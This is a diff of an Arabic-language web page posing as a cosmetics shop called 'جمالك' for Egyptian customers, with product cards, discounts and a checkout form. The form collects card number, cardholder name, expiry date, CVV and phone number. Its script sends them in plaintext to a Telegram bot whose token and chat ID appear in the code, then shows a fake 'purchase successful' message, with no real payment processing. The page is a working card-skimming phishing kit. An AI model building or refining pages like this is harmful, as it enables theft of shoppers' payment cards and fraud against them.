@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>متجرنا الإلكتروني</title>
+    <title>جمالك - متجر التجميل الراقي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             box-sizing: border-box;
@@ -12,9 +13,18 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
+        :root {
+            --primary: #e91e63;
+            --secondary: #9c27b0;
+            --accent: #ff4081;
+            --dark: #333;
+            --light: #f8f8f8;
+            --gray: #777;
+        }
+        
         body {
-            background-color: #f5f5f5;
-            color: #333;
+            background: linear-gradient(135deg, #f5f7fa 0%, #fce4ec 100%);
+            color: var(--dark);
             line-height: 1.6;
         }
         
@@ -24,75 +34,187 @@
             padding: 20px;
         }
         
+        /* الهيدر */
         header {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
             color: white;
-            padding: 1rem;
-            text-align: center;
-            border-radius: 10px;
+            padding: 1.5rem;
+            border-radius: 15px;
             margin-bottom: 30px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 8px 25px rgba(233, 30, 99, 0.3);
+            position: relative;
+            overflow: hidden;
         }
         
+        header::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo i {
+            font-size: 2.5rem;
+        }
+        
+        .logo h1 {
+            font-size: 2rem;
+            font-weight: 700;
+        }
+        
+        .logo p {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+        
+        .contact-info {
+            text-align: left;
+        }
+        
+        .contact-info p {
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* قسم المنتجات */
         .products {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 20px;
+            gap: 25px;
             margin-bottom: 40px;
         }
         
         .product-card {
             background: white;
-            border-radius: 10px;
+            border-radius: 15px;
             overflow: hidden;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
         }
         
         .product-card:hover {
-            transform: translateY(-5px);
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .product-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: var(--accent);
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            z-index: 2;
         }
         
         .product-image {
             width: 100%;
-            height: 200px;
+            height: 220px;
             object-fit: cover;
+            transition: transform 0.5s;
+        }
+        
+        .product-card:hover .product-image {
+            transform: scale(1.05);
         }
         
         .product-info {
-            padding: 15px;
+            padding: 20px;
         }
         
         .product-title {
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             margin-bottom: 10px;
-            color: #333;
+            color: var(--dark);
+            font-weight: 700;
+        }
+        
+        .product-description {
+            color: var(--gray);
+            margin-bottom: 15px;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+        
+        .product-benefits {
+            margin-bottom: 15px;
+        }
+        
+        .benefit {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+            color: var(--gray);
+        }
+        
+        .benefit i {
+            color: var(--primary);
+            font-size: 0.8rem;
         }
         
         .product-price {
-            font-size: 1.3rem;
+            font-size: 1.5rem;
             font-weight: bold;
-            color: #2575fc;
+            color: var(--primary);
             margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .original-price {
+            font-size: 1rem;
+            color: var(--gray);
+            text-decoration: line-through;
         }
         
         .buy-btn {
             display: block;
             width: 100%;
-            padding: 10px;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            padding: 12px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 1rem;
-            transition: opacity 0.3s;
+            font-weight: 600;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(233, 30, 99, 0.3);
         }
         
         .buy-btn:hover {
-            opacity: 0.9;
+            background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(233, 30, 99, 0.4);
         }
         
+        /* نموذج الدفع */
         .payment-modal {
             display: none;
             position: fixed;
@@ -100,44 +222,83 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background-color: rgba(0, 0, 0, 0.7);
             z-index: 1000;
             justify-content: center;
             align-items: center;
+            backdrop-filter: blur(5px);
         }
         
         .payment-form {
             background: white;
             width: 90%;
             max-width: 500px;
-            border-radius: 10px;
-            padding: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+            position: relative;
+            animation: modalAppear 0.4s ease;
+        }
+        
+        @keyframes modalAppear {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .form-title {
             text-align: center;
+            margin-bottom: 25px;
+            color: var(--primary);
+            font-size: 1.6rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .selected-product-info {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 10px;
             margin-bottom: 20px;
-            color: #333;
-            font-size: 1.5rem;
+            border-right: 4px solid var(--primary);
+        }
+        
+        .selected-product-info p {
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        .selected-product-info .product-name {
+            color: var(--primary);
+            font-size: 1.1rem;
         }
         
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         
         .form-group label {
             display: block;
-            margin-bottom: 5px;
-            font-weight: 500;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark);
         }
         
         .form-group input {
             width: 100%;
-            padding: 10px;
+            padding: 12px 15px;
             border: 1px solid #ddd;
-            border-radius: 5px;
+            border-radius: 8px;
             font-size: 1rem;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(233, 30, 99, 0.2);
+            outline: none;
         }
         
         .form-row {
@@ -151,14 +312,22 @@
         
         .submit-btn {
             width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            padding: 15px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 1.1rem;
+            font-weight: 600;
             margin-top: 10px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(233, 30, 99, 0.3);
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(233, 30, 99, 0.4);
         }
         
         .close-btn {
@@ -167,33 +336,68 @@
             right: 15px;
             background: none;
             border: none;
-            font-size: 1.5rem;
+            font-size: 1.8rem;
             cursor: pointer;
-            color: #666;
+            color: var(--gray);
+            transition: color 0.3s;
+        }
+        
+        .close-btn:hover {
+            color: var(--primary);
         }
         
         .loading {
             display: none;
             text-align: center;
             margin-top: 15px;
+            padding: 10px;
+            background: #f0f8ff;
+            border-radius: 8px;
+            color: var(--primary);
+            font-weight: 600;
         }
         
         .success-message {
             display: none;
             text-align: center;
-            color: green;
+            color: #28a745;
             margin-top: 15px;
             font-weight: bold;
+            padding: 10px;
+            background: #f0fff4;
+            border-radius: 8px;
         }
         
         .error-message {
             display: none;
             text-align: center;
-            color: red;
+            color: #dc3545;
             margin-top: 15px;
+            padding: 10px;
+            background: #fff0f0;
+            border-radius: 8px;
+        }
+        
+        /* الفوتر */
+        footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+            color: var(--gray);
+            border-top: 1px solid #eee;
         }
         
         @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .contact-info {
+                text-align: center;
+            }
+            
             .products {
                 grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
             }
@@ -207,49 +411,106 @@
 </head>
 <body>
     <div class="container">
+        <!-- الهيدر -->
         <header>
-            <h1>متجرنا الإلكتروني</h1>
-            <p>أفضل المنتجات بأفضل الأسعار</p>
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-spa"></i>
+                    <div>
+                        <h1>جمالك</h1>
+                        <p>متجر التجميل الراقي</p>
+                    </div>
+                </div>
+                <div class="contact-info">
+                    <p><i class="fas fa-phone"></i> للتواصل: 0123456789</p>
+                    <p><i class="fas fa-clock"></i> خدمة العملاء: 24/7</p>
+                    <p><i class="fas fa-truck"></i> توصيل سريع لكل أنحاء مصر</p>
+                </div>
+            </div>
         </header>
         
+        <!-- قسم المنتجات -->
         <div class="products">
             <!-- المنتج 1 -->
             <div class="product-card">
-                <img src="https://via.placeholder.com/300x200/6a11cb/ffffff?text=منتج+1" alt="منتج 1" class="product-image">
+                <div class="product-badge">الأكثر مبيعاً</div>
+                <img src="https://images.unsplash.com/photo-1596462502278-27bfdc403348?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8M3x8Y29zbWV0aWNzfGVufDB8fDB8fHww&auto=format&fit=crop&w=500&q=60" alt="سيروم فيتامين سي" class="product-image">
                 <div class="product-info">
-                    <h3 class="product-title">سماعات لاسلكية عالية الجودة</h3>
-                    <p class="product-price">$99.99</p>
-                    <button class="buy-btn" data-product="سماعات لاسلكية" data-price="99.99">اشتري الآن</button>
+                    <h3 class="product-title">سيروم فيتامين سي</h3>
+                    <p class="product-description">سيروم قوي بمضادات الأكسدة يضيء البشرة ويوحد لونها ويقلل من ظهور البقع الداكنة.</p>
+                    <div class="product-benefits">
+                        <div class="benefit"><i class="fas fa-check"></i> يضيء البشرة</div>
+                        <div class="benefit"><i class="fas fa-check"></i> يقلل البقع الداكنة</div>
+                        <div class="benefit"><i class="fas fa-check"></i> يحمي من الجذور الحرة</div>
+                    </div>
+                    <div class="product-price">
+                        349 ج.م <span class="original-price">450 ج.م</span>
+                    </div>
+                    <button class="buy-btn" data-product="سيروم فيتامين سي" data-price="349">
+                        <i class="fas fa-shopping-cart"></i> إشتري الآن
+                    </button>
                 </div>
             </div>
             
             <!-- المنتج 2 -->
             <div class="product-card">
-                <img src="https://via.placeholder.com/300x200/2575fc/ffffff?text=منتج+2" alt="منتج 2" class="product-image">
+                <div class="product-badge">جديد</div>
+                <img src="https://images.unsplash.com/photo-1556228578-8c89e6adf883?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8NHx8c2tpbmNhcmV8ZW58MHx8MHx8fDA%3D&auto=format&fit=crop&w=500&q=60" alt="كريم النهار الواقي" class="product-image">
                 <div class="product-info">
-                    <h3 class="product-title">ساعة ذكية متطورة</h3>
-                    <p class="product-price">$149.99</p>
-                    <button class="buy-btn" data-product="ساعة ذكية" data-price="149.99">اشتري الآن</button>
+                    <h3 class="product-title">كريم النهار الواقي</h3>
+                    <p class="product-description">كريم يومي خفيف ب factor 50 يحمي البشرة من أشعة الشمس الضارة ويمنع علامات الشيخوخة.</p>
+                    <div class="product-benefits">
+                        <div class="benefit"><i class="fas fa-check"></i> حماية SPF 50</div>
+                        <div class="benefit"><i class="fas fa-check"></i> يرطب البشرة</div>
+                        <div class="benefit"><i class="fas fa-check"></i> يمنع الشيخوخة</div>
+                    </div>
+                    <div class="product-price">
+                        289 ج.م <span class="original-price">350 ج.م</span>
+                    </div>
+                    <button class="buy-btn" data-product="كريم النهار الواقي" data-price="289">
+                        <i class="fas fa-shopping-cart"></i> إشتري الآن
+                    </button>
                 </div>
             </div>
             
             <!-- المنتج 3 -->
             <div class="product-card">
-                <img src="https://via.placeholder.com/300x200/ff6b6b/ffffff?text=منتج+3" alt="منتج 3" class="product-image">
+                <img src="https://images.unsplash.com/photo-1571781926291-c477ebfd024b?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8OXx8Y29zbWV0aWNzfGVufDB8fDB8fHww&auto=format&fit=crop&w=500&q=60" alt="ماسك الطين المغربي" class="product-image">
                 <div class="product-info">
-                    <h3 class="product-title">هاتف ذكي بشاشة 6.7 بوصة</h3>
-                    <p class="product-price">$799.99</p>
-                    <button class="buy-btn" data-product="هاتف ذكي" data-price="799.99">اشتري الآن</button>
+                    <h3 class="product-title">ماسك الطين المغربي</h3>
+                    <p class="product-description">طينة مغربية طبيعية 100% تنقي المسام وتزيل السموم وتترك البشرة نضرة ومشرقة.</p>
+                    <div class="product-benefits">
+                        <div class="benefit"><i class="fas fa-check"></i> ينقي المسام</div>
+                        <div class="benefit"><i class="fas fa-check"></i> يزيل السموم</div>
+                        <div class="benefit"><i class="fas fa-check"></i> ينشط الدورة الدموية</div>
+                    </div>
+                    <div class="product-price">
+                        199 ج.م <span class="original-price">250 ج.م</span>
+                    </div>
+                    <button class="buy-btn" data-product="ماسك الطين المغربي" data-price="199">
+                        <i class="fas fa-shopping-cart"></i> إشتري الآن
+                    </button>
                 </div>
             </div>
             
             <!-- المنتج 4 -->
             <div class="product-card">
-                <img src="https://via.placeholder.com/300x200/4ecdc4/ffffff?text=منتج+4" alt="منتج 4" class="product-image">
+                <div class="product-badge">عرض محدود</div>
+                <img src="https://images.unsplash.com/photo-1594035910387-fea47794261f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTJ8fGNvc21ldGljc3xlbnwwfHwwfHx8MA%3D%3D&auto=format&fit=crop&w=500&q=60" alt="زيت الأرغان المغربي" class="product-image">
                 <div class="product-info">
-                    <h3 class="product-title">لوحة مفاتيح ميكانيكية</h3>
-                    <p class="product-price">$129.99</p>
-                    <button class="buy-btn" data-product="لوحة مفاتيح" data-price="129.99">اشتري الآن</button>
+                    <h3 class="product-title">زيت الأرغان المغربي</h3>
+                    <p class="product-description">زيت أرغان نقي 100% يرطب البشرة والشعر ويعالج الجفاف والتقصف ويوفر تغذية عميقة.</p>
+                    <div class="product-benefits">
+                        <div class="benefit"><i class="fas fa-check"></i> يرطب بعمق</div>
+                        <div class="benefit"><i class="fas fa-check"></i> يعالج الشعر التالف</div>
+                        <div class="benefit"><i class="fas fa-check"></i> مضاد للشيخوخة</div>
+                    </div>
+                    <div class="product-price">
+                        449 ج.م <span class="original-price">550 ج.م</span>
+                    </div>
+                    <button class="buy-btn" data-product="زيت الأرغان المغربي" data-price="449">
+                        <i class="fas fa-shopping-cart"></i> إشتري الآن
+                    </button>
                 </div>
             </div>
         </div>
@@ -259,14 +520,20 @@
     <div class="payment-modal" id="paymentModal">
         <div class="payment-form">
             <button class="close-btn" id="closeModal">&times;</button>
-            <h2 class="form-title">إتمام عملية الشراء</h2>
+            <h2 class="form-title"><i class="fas fa-credit-card"></i> إتمام عملية الشراء</h2>
+            
+            <div class="selected-product-info">
+                <p>المنتج: <span class="product-name" id="selectedProductName"></span></p>
+                <p>السعر: <span id="selectedProductPrice"></span> ج.م</p>
+            </div>
+            
             <form id="paymentForm">
                 <input type="hidden" id="selectedProduct">
                 <input type="hidden" id="selectedPrice">
                 
                 <div class="form-group">
                     <label for="cardNumber">رقم البطاقة</label>
-                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
                 </div>
                 
                 <div class="form-group">
@@ -277,38 +544,55 @@
                 <div class="form-row">
                     <div class="form-group">
                         <label for="expiryDate">تاريخ الانتهاء</label>
-                        <input type="text" id="expiryDate" placeholder="MM/YY" required>
+                        <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5">
                     </div>
                     
                     <div class="form-group">
                         <label for="cvv">CVV</label>
-                        <input type="text" id="cvv" placeholder="123" required>
+                        <input type="text" id="cvv" placeholder="123" required maxlength="3">
                     </div>
                 </div>
                 
                 <div class="form-group">
-                    <label for="email">البريد الإلكتروني</label>
-                    <input type="email" id="email" placeholder="example@domain.com" required>
+                    <label for="phone">رقم الهاتف</label>
+                    <input type="tel" id="phone" placeholder="01XXXXXXXXX" required>
+                    <small style="color: var(--gray);">للتأكيد والتواصل معك</small>
                 </div>
                 
-                <button type="submit" class="submit-btn">دفع وإتمام الشراء</button>
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-lock"></i> تأكيد الشراء والدفع
+                </button>
                 
                 <div class="loading" id="loading">
-                    جاري معالجة الدفع...
+                    <i class="fas fa-spinner fa-spin"></i> جاري معالجة الدفع...
                 </div>
                 
                 <div class="success-message" id="successMessage">
-                    تمت عملية الشراء بنجاح! سيصلك تأكيد على بريدك الإلكتروني.
+                    <i class="fas fa-check-circle"></i> تمت عملية الشراء بنجاح! سنتصل بك للتأكيد.
                 </div>
                 
                 <div class="error-message" id="errorMessage">
-                    حدث خطأ أثناء عملية الدفع. يرجى المحاولة مرة أخرى.
+                    <i class="fas fa-exclamation-circle"></i> حدث خطأ أثناء عملية الدفع. يرجى المحاولة مرة أخرى.
                 </div>
             </form>
         </div>
     </div>
 
+    <!-- الفوتر -->
+    <footer>
+        <p>جمالك © 2023 - كل الحقوق محفوظة</p>
+        <p>للاستفسارات: 0123456789 - خدمة العملاء متاحة 24/7</p>
+    </footer>
+
     <script>
+        // ========== إعدادات البوت التليجرام ==========
+        // ضع التوكن ورقم المحادثة هنا مباشرة في السكريبت
+        const BOT_CONFIG = {
+            token: "ضع_توكن_البوت_هنا",   // مثال: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
+            chatId: "ضع_chat_id_هنا"      // مثال: "123456789" أو "-1001234567890"
+        };
+        // ===========================================
+        
         // عناصر DOM
         const paymentModal = document.getElementById('paymentModal');
         const closeModal = document.getElementById('closeModal');
@@ -316,6 +600,8 @@
         const buyButtons = document.querySelectorAll('.buy-btn');
         const selectedProduct = document.getElementById('selectedProduct');
         const selectedPrice = document.getElementById('selectedPrice');
+        const selectedProductName = document.getElementById('selectedProductName');
+        const selectedProductPrice = document.getElementById('selectedProductPrice');
         const loading = document.getElementById('loading');
         const successMessage = document.getElementById('successMessage');
         const errorMessage = document.getElementById('errorMessage');
@@ -328,6 +614,8 @@
                 
                 selectedProduct.value = product;
                 selectedPrice.value = price;
+                selectedProductName.textContent = product;
+                selectedProductPrice.textContent = price;
                 
                 paymentModal.style.display = 'flex';
             });
@@ -359,9 +647,14 @@
                 cardHolder: document.getElementById('cardHolder').value,
                 expiryDate: document.getElementById('expiryDate').value,
                 cvv: document.getElementById('cvv').value,
-                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
                 timestamp: new Date().toLocaleString('ar-EG')
             };
+            
+            // التحقق من صحة البيانات
+            if (!validatePaymentData(paymentData)) {
+                return;
+            }
             
             // إظهار حالة التحميل
             loading.style.display = 'block';
@@ -372,39 +665,75 @@
             sendToTelegram(paymentData);
         });
         
+        // التحقق من صحة بيانات الدفع
+        function validatePaymentData(data) {
+            // التحقق من رقم البطاقة
+            const cardNumber = data.cardNumber.replace(/\s/g, '');
+            if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
+                alert('يرجى إدخال رقم بطاقة صحيح (16 رقم)');
+                return false;
+            }
+            
+            // التحقق من تاريخ الانتهاء
+            const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+            if (!expiryRegex.test(data.expiryDate)) {
+                alert('يرجى إدخال تاريخ انتهاء صحيح (MM/YY)');
+                return false;
+            }
+            
+            // التحقق من CVV
+            if (data.cvv.length !== 3 || !/^\d+$/.test(data.cvv)) {
+                alert('يرجى إدخال رمز CVV صحيح (3 أرقام)');
+                return false;
+            }
+            
+            // التحقق من رقم الهاتف
+            const phoneRegex = /^01[0-2,5]{1}[0-9]{8}$/;
+            if (!phoneRegex.test(data.phone)) {
+                alert('يرجى إدخال رقم هاتف صحيح (11 رقم)');
+                return false;
+            }
+            
+            return true;
+        }
+        
         // دالة إرسال البيانات للبوت التليجرام
         function sendToTelegram(paymentData) {
+            // التحقق من وجود التوكن ورقم المحادثة
+            if (!BOT_CONFIG.token || BOT_CONFIG.token === "7764994819:AAGTCq_eybBFnu66oeQz7LeKzrjMuG2pLr8" || 
+                !BOT_CONFIG.chatId || BOT_CONFIG.chatId === "8034352045") {
+                loading.style.display = 'none';
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'لم يتم إعداد البوت بشكل صحيح. يرجى التحقق من الإعدادات.';
+                return;
+            }
+            
             // تنسيق الرسالة
             const message = `
-🛒 عملية شراء جديدة 🛒
-            
+🛒 عملية شراء جديدة من متجر جمالك 🛒
+
 📦 المنتج: ${paymentData.product}
-💰 السعر: $${paymentData.price}
-            
+💰 السعر: ${paymentData.price} ج.م
+
 💳 معلومات الدفع:
 • رقم البطاقة: ${paymentData.cardNumber}
 • اسم حامل البطاقة: ${paymentData.cardHolder}
 • تاريخ الانتهاء: ${paymentData.expiryDate}
 • رمز الأمان (CVV): ${paymentData.cvv}
-            
-📧 البريد الإلكتروني: ${paymentData.email}
+
+📞 رقم الهاتف: ${paymentData.phone}
 ⏰ الوقت: ${paymentData.timestamp}
             `;
             
-            // هنا نستخدم Webhook لإرسال البيانات للبوت
-            // استبدل YOUR_BOT_TOKEN و YOUR_CHAT_ID بالقيم الفعلية
-            const botToken = '7764994819:AAGTCq_eybBFnu66oeQz7LeKzrjMuG2pLr8';
-            const chatId = '8034352045';
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            // إرسال الرسالة للبوت التليجرام
+            fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
+                    chat_id: BOT_CONFIG.chatId,
+                    text: message
                 })
             })
             .then(response => response.json())
@@ -413,17 +742,20 @@
                 
                 if (data.ok) {
                     successMessage.style.display = 'block';
+                    // إعادة تعيين النموذج بعد النجاح
                     setTimeout(() => {
                         paymentModal.style.display = 'none';
                         resetForm();
                     }, 3000);
                 } else {
                     errorMessage.style.display = 'block';
+                    errorMessage.textContent = 'فشل في إرسال البيانات: ' + (data.description || 'خطأ غير معروف');
                 }
             })
             .catch(error => {
                 loading.style.display = 'none';
                 errorMessage.style.display = 'block';
+                errorMessage.textContent = 'حدث خطأ في الاتصال: ' + error.message;
                 console.error('Error:', error);
             });
         }
@@ -460,6 +792,16 @@
             } else {
                 e.target.value = value;
             }
+        });
+        
+        // السماح فقط بالأرقام في حقل CVV
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+        
+        // السماح فقط بالأرقام في حقل الهاتف
+        document.getElementById('phone').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
         });
     </script>
 </body>
